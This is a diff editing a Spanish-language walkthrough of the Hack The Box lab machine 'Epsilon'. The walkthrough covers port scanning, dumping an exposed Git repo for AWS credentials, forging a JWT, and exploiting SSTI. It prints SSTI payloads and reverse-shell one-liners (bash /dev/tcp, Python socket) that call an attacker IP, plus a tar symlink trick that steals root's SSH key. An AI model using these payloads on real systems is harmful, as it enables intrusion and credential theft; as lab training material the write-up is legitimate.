@@ -12,7 +12,7 @@
 </ol>
 
 <h3>1. Enumeración de puertos</h3>
-<p>El primer paso es identificar qué servicios están expuestos en la máquina objetivo. Usamos <code>nmap</code> para un escaneo completo de todos los puertos TCP.</p>
+<p>El primer paso es identificar qué servicios están expuestos en la máquina objetivo. Usamos <code>nmap</code> para un escaneo completo de todos los puertos TCP:</p>
 
 <pre><code>nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 10.10.10.134</code></pre>
 
@@ -20,11 +20,11 @@
 <ul>
   <li><code>-p-</code>: Escanea todos los 65535 puertos.</li>
   <li><code>--open</code>: Solo muestra los puertos abiertos.</li>
-  <li><code>-sT</code>: Escaneo TCP completo (no stealth, conecta directamente).</li>
-  <li><code>--min-rate 5000</code>: Envía al menos 5000 paquetes por segundo para acelerar el escaneo.</li>
-  <li><code>-vvv</code>: Verbosidad máxima, muestra el progreso y detalles.</li>
-  <li><code>-n</code>: Evita resolución de DNS para acelerar.</li>
-  <li><code>-Pn</code>: No hace ping antes del escaneo (útil para firewalls que bloquean ICMP).</li>
+  <li><code>-sT</code>: Escaneo TCP completo (conexión directa).</li>
+  <li><code>--min-rate 5000</code>: Envía al menos 5000 paquetes por segundo.</li>
+  <li><code>-vvv</code>: Verbosidad máxima.</li>
+  <li><code>-n</code>: Evita resolución de DNS.</li>
+  <li><code>-Pn</code>: Omite ping inicial (útil contra firewalls que bloquean ICMP).</li>
 </ul>
 
 <p><strong>Resultados:</strong></p>
@@ -32,24 +32,24 @@
 80/tcp   open  http
 5000/tcp open  http</code></pre>
 
-<p>Interpretación: Hay un servidor SSH (posible acceso remoto), un sitio web público en el puerto 80, y otro servidor HTTP adicional en el puerto 5000 (posiblemente una aplicación web interna o API).</p>
+<p>Interpretación: Servidor SSH para acceso remoto, sitio web público en puerto 80 y otra aplicación HTTP en 5000 (API o aplicación interna).</p>
 
 <h3>2. Enumeración HTTP y volcado del repositorio Git</h3>
-<p>Al visitar <code>http://10.10.10.134</code> se obtiene un código 403, indicando que el acceso directo está prohibido. Sin embargo, podemos revisar si existe un repositorio Git expuesto en <code>/.git</code>. Para esto, usamos <code>gitdumper</code>:</p>
+<p>Al visitar <code>http://10.10.10.134</code> se obtiene un 403. Revisamos si hay un repositorio Git expuesto en <code>/.git</code> usando <code>gitdumper</code>:</p>
 
 <pre><code>./gitdumper.sh http://10.10.10.134/.git/ ~/CTF/Epsilon/loot/epsilon-repo</code></pre>
 
-<p>Esto nos permite obtener todo el historial de commits, archivos y credenciales que hayan sido expuestos accidentalmente.</p>
+<p>Esto permite obtener historial de commits, archivos y credenciales filtradas.</p>
 
 <h4>Revisión de commits para encontrar credenciales</h4>
-<p>Al inspeccionar los archivos actuales, las credenciales no estaban presentes. Por lo tanto, revisamos los commits anteriores:</p>
+<p>Al inspeccionar los archivos actuales, las credenciales no estaban presentes. Revisamos los commits anteriores:</p>
 
 <pre><code>cd ~/CTF/Epsilon/loot/epsilon-repo
 git log --oneline --graph --all
 git log -p > ../commits_diff.txt
 cat ../commits_diff.txt</code></pre>
 
-<p>En el historial, encontramos un commit donde las credenciales de AWS Lambda sí estaban presentes:</p>
+<p>En un commit anterior encontramos las credenciales de AWS Lambda:</p>
 
 <pre><code>@@ -8,8 +8,8 @@ session = Session(
 -     aws_access_key_id='<aws_access_key_id>',
@@ -60,44 +60,27 @@ cat ../commits_diff.txt</code></pre>
       endpoint_url='http://cloud.epsilon.htb'
 )</code></pre>
 
-<p>✅ Importante: Las credenciales no estaban visibles en la versión actual del repositorio, solo al retroceder en los commits.</p>
+<p>✅ Importante: Solo retrocediendo en los commits se encuentran las credenciales.</p>
 
 <h3>3. Enumeración AWS Lambda</h3>
-<p>Configuramos AWS CLI usando las credenciales obtenidas:</p>
+<p>Configuramos AWS CLI con las credenciales:</p>
 
 <pre><code>aws configure
-# Ingresar aws_access_key_id y aws_secret_access_key
+# aws_access_key_id y aws_secret_access_key
 # region: us-east-1</code></pre>
 
-<p>Listamos las funciones Lambda disponibles:</p>
+<p>Listamos las funciones Lambda:</p>
 
 <pre><code>aws --endpoint-url=http://cloud.epsilon.htb/ lambda list-functions</code></pre>
 
-<pre><code>{
-    "Functions": [
-        {
-            "FunctionName": "costume_shop_v1",
-            "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1",
-            "Runtime": "python3.7",
-            "Role": "arn:aws:iam::123456789012:role/service-role/dev",
-            "Handler": "my-function.handler",
-            "CodeSize": 478,
-            "Timeout": 3,
-            "LastModified": "2021-11-21T14:38:10.553+0000",
-            "State": "Active",
-            "PackageType": "Zip"
-        }
-    ]
-}</code></pre>
-
-<p>Descargamos el código de la función Lambda:</p>
+<p>Descargamos el código de la función:</p>
 
 <pre><code>aws --endpoint-url=http://cloud.epsilon.htb/ lambda get-function --function-name costume_shop_v1
 wget http://cloud.epsilon.htb/path/to/code.zip
 unzip code.zip
 cat lambda_function.py</code></pre>
 
-<p>En este archivo se encuentra la <strong>clave secreta</strong> que usamos para firmar JWT.</p>
+<p>En este archivo se encuentra la <strong>clave secreta</strong> para firmar JWT.</p>
 
 <h3>4. Explotación y acceso inicial</h3>
 <p>Generamos un token JWT de administrador usando PyJWT:</p>
@@ -111,17 +94,27 @@ print(token)</code></pre>
 
 <pre><code>curl -v --cookie "auth=GENERATED_JWT_TOKEN_HERE" http://10.10.10.134/home</code></pre>
 
+<p>También podemos usar la misma cookie para acceder a <code>http://epsilon.htb:5000/home</code>:</p>
+<img src="/img/epsilon/img3.png" alt="Home dentro de la plataforma">
+<img src="/img/epsilon/img4.png" alt="Vista del home autenticado">
+
 <h4>Explotación SSTI</h4>
-<p>En la ruta <code>/order</code>, los campos de entrada son evaluados con <code>render_template_string</code>, permitiendo <strong>SSTI (Server Side Template Injection)</strong>. Probamos:</p>
+<p>En <code>/order</code>, los campos son evaluados con <code>render_template_string</code>, permitiendo <strong>SSTI</strong>. Para reconocimiento probamos:</p>
 
-<pre><code>{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}</code></pre>
+<pre><code>{{ 3*3 }}</code></pre>
 
-<p>Si obtenemos salida del comando, confirmamos ejecución remota de comandos. Luego, lanzamos reverse shell:</p>
+<p>Obtenemos <strong>9</strong> en la respuesta (Burp), confirmando vulnerabilidad:</p>
+<img src="/img/epsilon/img5.png" alt="Prueba SSTI">
 
-<pre><code>bash -c "bash -i >& /dev/tcp/10.10.14.15/443 0>&1"</code></pre>
+<p>Para ejecutar reverse shell usamos:</p>
+
+<pre><code>{{ self.__init__.__globals__.__builtins__.__import__('os').popen('python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\'10.10.14.36\',6969));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\'/bin/bash\')"').read() }}</code></pre>
+
+<p>Obtuvimos reverse shell y la primera flag (<code>user.txt</code>):</p>
+<img src="/img/epsilon/img6.png" alt="Primera flag obtenida">
 
 <h3>5. Escalada de privilegios</h3>
-<p>Usamos <code>pspy</code> para enumerar cronjobs y descubrimos un backup periódico que ejecuta <code>tar</code> con opción <code>-h</code>:</p>
+<p>Usamos <code>pspy</code> y encontramos un cronjob de backup que ejecuta <code>tar -h</code> cada 5 segundos:</p>
 
 <pre><code>#!/bin/bash
 file=`date +%N`
@@ -133,7 +126,7 @@ check_file=`date +%N`
 /usr/bin/tar -chvf "/var/backups/web_backups/${check_file}.tar" /opt/backups/checksum "/opt/backups/$file.tar"
 /usr/bin/rm -rf /opt/backups/*</code></pre>
 
-<p>Se puede abusar de la opción <code>-h</code> de <code>tar</code> para reemplazar archivos críticos mediante enlaces simbólicos:</p>
+<p>Abusamos de <code>-h</code> para reemplazar archivos críticos mediante enlaces simbólicos:</p>
 
 <pre><code>#!/bin/bash
 while true; do 
@@ -144,7 +137,19 @@ while true; do
     fi; 
 done</code></pre>
 
-<p>Después, conectamos vía SSH como root:</p>
+<p>Explicación: Este script se ejecuta en bucle esperando que <code>checksum</code> exista. Una vez creado por el cronjob, lo borramos y creamos un enlace simbólico apuntando a <code>/root/.ssh/id_rsa</code>. Cuando el cronjob vuelve a empaquetar con <code>-h</code>, se copia la clave privada a un lugar donde podemos accederla, simulando que se “descomprime” el backup.</p>
+
+<p>Ejemplo de extracción de <code>id_rsa</code>:</p>
+<pre><code>cd /tmp
+./root.sh
+cd /var/backups/web_backups
+cp 503891800.tar /tmp
+cd /tmp
+tar -xf 503891800.tar
+cd opt/backups
+cat checksum  # Contiene la id_rsa</code></pre>
+
+<p>Finalmente, conectamos vía SSH como root:</p>
 
 <pre><code>ssh -i id_rsa root@10.10.10.134</code></pre>
 
